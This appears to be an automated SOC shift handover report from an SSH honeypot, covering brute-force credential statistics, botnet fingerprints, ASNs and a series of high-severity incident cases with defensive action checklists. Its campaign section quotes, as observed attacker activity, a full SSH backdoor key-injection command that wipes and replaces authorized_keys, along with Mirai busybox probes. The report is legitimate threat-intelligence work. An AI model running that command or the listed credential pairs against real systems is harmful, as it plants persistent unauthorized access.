# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-23 |
| **Generated At** | 2026-08-23T06:48:50Z |
| **Shift Time** | 06:48 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **122** |
| Confirmed Threats | **101** |
| False Positives Filtered | **21** (17.2%) |
| Unique Attacker IPs | **71** |
| Countries of Origin | **25** |
| High Severity Cases | **64** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **58** |
| Malware Samples Analyzed | **2** HIGH · **19** MED · 23 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **84** |
| Unique Credential Pairs | **44** |
| Unique Usernames | **12** |
| Unique Passwords | **44** |
| Successful Auth Pairs | **75** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 16 |
| `ubuntu` | 13 |
| `test` | 12 |
| `debian` | 10 |
| `guest` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `test2016` | 6 |
| `debian2023` | 6 |
| `test2003` | 6 |
| `admin2000` | 5 |
| `centos2014` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `test` | `test2016` | 6 |
| `debian` | `debian2023` | 6 |
| `test` | `test2003` | 6 |
| `admin` | `admin2000` | 5 |
| `centos` | `centos2014` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `` | `94.154.43.183` | 2026-08-23T02:55:11 |
| `test` | `test2016` | `2.249.150.53` | 2026-08-23T02:57:08 |
| `ubuntu` | `P@ssw0rd#1234` | `217.60.255.130` | 2026-08-23T02:57:15 |
| `test` | `test2016` | `116.48.143.166` | 2026-08-23T02:57:17 |
| `root` | `qazwsx!@#` | `217.60.255.130` | 2026-08-23T02:57:18 |
| `guest` | `guest2018` | `175.43.163.240` | 2026-08-23T03:02:35 |
| `guest` | `guest2018` | `189.243.19.118` | 2026-08-23T03:02:43 |
| `guest` | `guest2018` | `80.244.78.231` | 2026-08-23T03:02:44 |
| `guest` | `guest2018` | `45.178.227.0` | 2026-08-23T03:02:52 |
| `debian` | `debian2023` | `10.0.0.73` | 2026-08-23T03:04:32 |
| `debian` | `debian2023` | `45.187.33.152` | 2026-08-23T03:06:04 |
| `debian` | `debian2023` | `70.89.116.5` | 2026-08-23T03:06:11 |
| `ubuntu` | `ok123` | `217.60.255.130` | 2026-08-23T03:06:43 |
| `root` | `user` | `217.60.255.130` | 2026-08-23T03:06:48 |
| `test` | `test2016` | `10.0.0.73` | 2026-08-23T03:08:20 |
| `ubuntu` | `P@ssword@2025` | `217.60.255.130` | 2026-08-23T03:16:13 |
| `root` | `Qwerty1234` | `217.60.255.130` | 2026-08-23T03:16:17 |
| `config` | `config2006` | `10.0.0.73` | 2026-08-23T03:17:12 |
| `debian` | `debian2023` | `122.187.230.183` | 2026-08-23T03:21:36 |
| `debian` | `debian2023` | `165.154.1.244` | 2026-08-23T03:21:46 |
| `test` | `test2016` | `111.171.127.190` | 2026-08-23T03:24:49 |
| `test` | `test2016` | `178.178.194.192` | 2026-08-23T03:24:57 |
| `ubuntu` | `Power@123` | `217.60.255.130` | 2026-08-23T03:25:37 |
| `root` | `123qwe` | `217.60.255.130` | 2026-08-23T03:25:41 |
| `root` | `Sm123456@` | `104.28.233.73` | 2026-08-23T03:28:08 |
| `345gs5662d34` | `345gs5662d34` | `104.28.233.73` | 2026-08-23T03:28:10 |
| `root` | `3245gs5662d34` | `104.28.233.73` | 2026-08-23T03:28:12 |
| `admin` | `admin2000` | `123.52.202.92` | 2026-08-23T03:29:42 |
| `admin` | `admin2000` | `61.2.44.54` | 2026-08-23T03:29:50 |
| `config` | `config2006` | `103.61.71.50` | 2026-08-23T03:35:01 |
| `config` | `config2006` | `112.29.68.22` | 2026-08-23T03:35:09 |
| `ubuntu` | `ABC123abc` | `217.60.255.130` | 2026-08-23T03:35:14 |
| `root` | `free` | `217.60.255.130` | 2026-08-23T03:35:18 |
| `unknown` | `dietpi` | `10.0.0.73` | 2026-08-23T03:36:54 |
| `admin` | `admin2000` | `10.0.0.73` | 2026-08-23T03:40:43 |
| `ubuntu` | `1234.abcd` | `217.60.255.130` | 2026-08-23T03:44:40 |
| `root` | `q1w2e3r4T5` | `217.60.255.130` | 2026-08-23T03:44:44 |
| `test` | `test2003` | `10.0.0.73` | 2026-08-23T03:49:32 |
| `unknown` | `dietpi` | `120.194.50.39` | 2026-08-23T03:53:37 |
| `unknown` | `dietpi` | `69.124.69.20` | 2026-08-23T03:53:44 |
| `ubuntu` | `guest123` | `217.60.255.130` | 2026-08-23T03:54:10 |
| `root` | `1a2b3c4d` | `217.60.255.130` | 2026-08-23T03:54:13 |
| `admin` | `admin2000` | `220.180.249.165` | 2026-08-23T03:57:06 |
| `support` | `support` | `176.53.159.196` | 2026-08-23T03:57:53 |
| `centos` | `centos2014` | `85.105.255.56` | 2026-08-23T04:02:04 |
| `centos` | `centos2014` | `178.178.222.53` | 2026-08-23T04:02:16 |
| `ubuntu` | `steam@2024` | `217.60.255.130` | 2026-08-23T04:03:37 |
| `root` | `P@ssw0rd@` | `217.60.255.130` | 2026-08-23T04:03:41 |
| `test` | `test2003` | `126.13.48.207` | 2026-08-23T04:07:02 |
| `test` | `test2003` | `111.70.17.73` | 2026-08-23T04:07:10 |
| `test` | `test2003` | `63.65.203.83` | 2026-08-23T04:07:13 |
| `test` | `test2003` | `58.242.215.40` | 2026-08-23T04:07:23 |
| `debian` | `debian2019` | `10.0.0.73` | 2026-08-23T04:09:06 |
| `debian` | `debian2019` | `190.60.37.146` | 2026-08-23T04:10:51 |
| `centos` | `centos2014` | `10.0.0.73` | 2026-08-23T04:13:06 |
| `ubuntu` | `kafka@2024` | `217.60.255.130` | 2026-08-23T04:13:13 |
| `root` | `Test12345` | `217.60.255.130` | 2026-08-23T04:13:19 |
| `admin` | `admin` | `10.0.0.73` | 2026-08-23T04:16:37 |
| `support` | `support` | `10.0.0.73` | 2026-08-23T04:22:35 |
| `ubuntu` | `ftpuser1234!` | `217.60.255.130` | 2026-08-23T04:22:43 |
| `root` | `xx` | `217.60.255.130` | 2026-08-23T04:22:47 |
| `debian` | `debian2019` | `82.102.188.117` | 2026-08-23T04:25:53 |
| `debian` | `debian2019` | `189.51.96.70` | 2026-08-23T04:26:01 |
| `centos` | `centos2014` | `200.199.32.174` | 2026-08-23T04:29:26 |
| `centos` | `centos2014` | `121.179.93.147` | 2026-08-23T04:29:36 |
| `ubuntu` | `mongodb@2024` | `217.60.255.130` | 2026-08-23T04:32:19 |
| `root` | `asdasd` | `217.60.255.130` | 2026-08-23T04:32:23 |
| `guest` | `123456789` | `61.93.135.225` | 2026-08-23T04:34:30 |
| `centos` | `centos2022` | `178.178.222.59` | 2026-08-23T04:39:36 |
| `nobody` | `nobody2023` | `10.0.0.73` | 2026-08-23T04:41:24 |
| `ubuntu` | `P@@ssw0rd` | `217.60.255.130` | 2026-08-23T04:41:44 |
| `root` | `abc1234.` | `217.60.255.130` | 2026-08-23T04:41:48 |
| `guest` | `123456789` | `10.0.0.73` | 2026-08-23T04:45:27 |
| `ubuntu` | `2wsx#EDC` | `217.60.255.130` | 2026-08-23T04:51:16 |
| `root` | `A1q2w3e4r` | `217.60.255.130` | 2026-08-23T04:51:19 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **122** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 37 |
| OpenSSH | 32 |
| Go SSH scanner | 3 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 32 | 32 |
| `419da4c91ddb...` | Modern SSH client | 26 | 1 |
| `f555226df196...` | Mirai/variant | 3 | 1 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |
| `98f63c4d9c87...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 32 | 32 | Mirai/variant |
| `419da4c91ddb...` | libssh | 26 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 8 | 4 | — |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `94.154.43.183`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `104.28.233.73`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **71** |
| Unique ASNs | **57** |
| High-Risk ASNs | **43** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS3301` | Telia Company AB | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS25159` | PJSC MegaFon | 3 | HIGH |
| `AS398324` | Censys, Inc. | 3 | HIGH |
| `AS213412` | ONYPHE SAS | 2 | LOW |
| `AS396982` | Google LLC | 2 | LOW |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (64)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b778bd8bfd0c

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]183` |
| **First Seen** | 2026-08-23 02:55 |
| **Last Seen** | 2026-08-23 02:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 02:55:11` | `cowrie.session.connect` |
| `2026-08-23 02:55:11` | `cowrie.login.success` |
| `2026-08-23 02:55:12` | `cowrie.session.params` |
| `2026-08-23 02:55:12` | `cowrie.command.input` |
| `2026-08-23 02:55:13` | `cowrie.command.input` |
| `2026-08-23 02:55:13` | `cowrie.command.input` |
| `2026-08-23 02:55:14` | `cowrie.command.input` |
| `2026-08-23 02:55:14` | `cowrie.command.failed` |
| `2026-08-23 02:55:14` | `cowrie.log.closed` |
| `2026-08-23 02:55:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]183` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bb0e84967bc

| Field | Detail |
|---|---|
| **Source IP** | `2.249.150[.]53` |
| **First Seen** | 2026-08-23 02:57 |
| **Last Seen** | 2026-08-23 02:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 02:57:07` | `cowrie.session.connect` |
| `2026-08-23 02:57:07` | `cowrie.client.version` |
| `2026-08-23 02:57:07` | `cowrie.client.kex` |
| `2026-08-23 02:57:08` | `cowrie.login.success` |
| `2026-08-23 02:57:08` | `cowrie.direct-tcpip.request` |
| `2026-08-23 02:57:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.249.150[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.249.150[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-537c254f2946

| Field | Detail |
|---|---|
| **Source IP** | `116.48.143[.]166` |
| **First Seen** | 2026-08-23 02:57 |
| **Last Seen** | 2026-08-23 02:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 02:57:13` | `cowrie.session.connect` |
| `2026-08-23 02:57:14` | `cowrie.client.version` |
| `2026-08-23 02:57:14` | `cowrie.client.kex` |
| `2026-08-23 02:57:17` | `cowrie.login.success` |
| `2026-08-23 02:57:18` | `cowrie.direct-tcpip.request` |
| `2026-08-23 02:57:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.48.143[.]166` to AbuseIPDB if not already reported
- [ ] Block `116.48.143[.]166` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8691ce693be8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 02:57 |
| **Last Seen** | 2026-08-23 02:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 02:57:14` | `cowrie.session.connect` |
| `2026-08-23 02:57:14` | `cowrie.client.version` |
| `2026-08-23 02:57:14` | `cowrie.client.kex` |
| `2026-08-23 02:57:15` | `cowrie.login.success` |
| `2026-08-23 02:57:15` | `cowrie.direct-tcpip.request` |
| `2026-08-23 02:57:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 02:57:15` | `cowrie.direct-tcpip.data` |
| `2026-08-23 02:57:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b441a3f9299

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 02:57 |
| **Last Seen** | 2026-08-23 02:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 02:57:17` | `cowrie.session.connect` |
| `2026-08-23 02:57:17` | `cowrie.client.version` |
| `2026-08-23 02:57:18` | `cowrie.client.kex` |
| `2026-08-23 02:57:18` | `cowrie.login.success` |
| `2026-08-23 02:57:19` | `cowrie.direct-tcpip.request` |
| `2026-08-23 02:57:19` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 02:57:19` | `cowrie.direct-tcpip.data` |
| `2026-08-23 02:57:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02adc153ad24

| Field | Detail |
|---|---|
| **Source IP** | `175.43.163[.]240` |
| **First Seen** | 2026-08-23 03:02 |
| **Last Seen** | 2026-08-23 03:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:02:31` | `cowrie.session.connect` |
| `2026-08-23 03:02:32` | `cowrie.client.version` |
| `2026-08-23 03:02:32` | `cowrie.client.kex` |
| `2026-08-23 03:02:35` | `cowrie.login.success` |
| `2026-08-23 03:02:35` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:02:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.43.163[.]240` to AbuseIPDB if not already reported
- [ ] Block `175.43.163[.]240` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab6da5dd2d45

| Field | Detail |
|---|---|
| **Source IP** | `189.243.19[.]118` |
| **First Seen** | 2026-08-23 03:02 |
| **Last Seen** | 2026-08-23 03:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:02:41` | `cowrie.session.connect` |
| `2026-08-23 03:02:41` | `cowrie.client.version` |
| `2026-08-23 03:02:41` | `cowrie.client.kex` |
| `2026-08-23 03:02:43` | `cowrie.login.success` |
| `2026-08-23 03:02:44` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:02:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.243.19[.]118` to AbuseIPDB if not already reported
- [ ] Block `189.243.19[.]118` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b01a7a004ec8

| Field | Detail |
|---|---|
| **Source IP** | `80.244.78[.]231` |
| **First Seen** | 2026-08-23 03:02 |
| **Last Seen** | 2026-08-23 03:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:02:43` | `cowrie.session.connect` |
| `2026-08-23 03:02:44` | `cowrie.client.version` |
| `2026-08-23 03:02:44` | `cowrie.client.kex` |
| `2026-08-23 03:02:44` | `cowrie.login.success` |
| `2026-08-23 03:02:45` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:02:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.244.78[.]231` to AbuseIPDB if not already reported
- [ ] Block `80.244.78[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1774988e7a81

| Field | Detail |
|---|---|
| **Source IP** | `45.178.227[.]0` |
| **First Seen** | 2026-08-23 03:02 |
| **Last Seen** | 2026-08-23 03:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:02:50` | `cowrie.session.connect` |
| `2026-08-23 03:02:50` | `cowrie.client.version` |
| `2026-08-23 03:02:50` | `cowrie.client.kex` |
| `2026-08-23 03:02:52` | `cowrie.login.success` |
| `2026-08-23 03:02:53` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:02:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.178.227[.]0` to AbuseIPDB if not already reported
- [ ] Block `45.178.227[.]0` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fb7746f1942

| Field | Detail |
|---|---|
| **Source IP** | `45.187.33[.]152` |
| **First Seen** | 2026-08-23 03:06 |
| **Last Seen** | 2026-08-23 03:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:06:01` | `cowrie.session.connect` |
| `2026-08-23 03:06:02` | `cowrie.client.version` |
| `2026-08-23 03:06:02` | `cowrie.client.kex` |
| `2026-08-23 03:06:04` | `cowrie.login.success` |
| `2026-08-23 03:06:04` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:06:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.187.33[.]152` to AbuseIPDB if not already reported
- [ ] Block `45.187.33[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c28031eaeb0c

| Field | Detail |
|---|---|
| **Source IP** | `70.89.116[.]5` |
| **First Seen** | 2026-08-23 03:06 |
| **Last Seen** | 2026-08-23 03:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:06:09` | `cowrie.session.connect` |
| `2026-08-23 03:06:10` | `cowrie.client.version` |
| `2026-08-23 03:06:10` | `cowrie.client.kex` |
| `2026-08-23 03:06:11` | `cowrie.login.success` |
| `2026-08-23 03:06:12` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:06:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.89.116[.]5` to AbuseIPDB if not already reported
- [ ] Block `70.89.116[.]5` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f52681ad494

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 03:06 |
| **Last Seen** | 2026-08-23 03:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:06:42` | `cowrie.session.connect` |
| `2026-08-23 03:06:42` | `cowrie.client.version` |
| `2026-08-23 03:06:43` | `cowrie.client.kex` |
| `2026-08-23 03:06:43` | `cowrie.login.success` |
| `2026-08-23 03:06:44` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:06:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 03:06:44` | `cowrie.direct-tcpip.data` |
| `2026-08-23 03:06:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a300b74eea1f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 03:06 |
| **Last Seen** | 2026-08-23 03:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:06:47` | `cowrie.session.connect` |
| `2026-08-23 03:06:47` | `cowrie.client.version` |
| `2026-08-23 03:06:47` | `cowrie.client.kex` |
| `2026-08-23 03:06:48` | `cowrie.login.success` |
| `2026-08-23 03:06:48` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:06:48` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 03:06:48` | `cowrie.direct-tcpip.data` |
| `2026-08-23 03:06:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-526ec58a380d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 03:16 |
| **Last Seen** | 2026-08-23 03:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:16:12` | `cowrie.session.connect` |
| `2026-08-23 03:16:12` | `cowrie.client.version` |
| `2026-08-23 03:16:12` | `cowrie.client.kex` |
| `2026-08-23 03:16:13` | `cowrie.login.success` |
| `2026-08-23 03:16:13` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:16:13` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 03:16:13` | `cowrie.direct-tcpip.data` |
| `2026-08-23 03:16:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e96d33b936f8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 03:16 |
| **Last Seen** | 2026-08-23 03:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 03:16:16` | `cowrie.session.connect` |
| `2026-08-23 03:16:16` | `cowrie.client.version` |
| `2026-08-23 03:16:16` | `cowrie.client.kex` |
| `2026-08-23 03:16:17` | `cowrie.login.success` |
| `2026-08-23 03:16:17` | `cowrie.direct-tcpip.request` |
| `2026-08-23 03:16:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 03:16:17` | `cowrie.direct-tcpip.data` |
| `2026-08-23 03:16:18` | `cowrie.session.closed` |

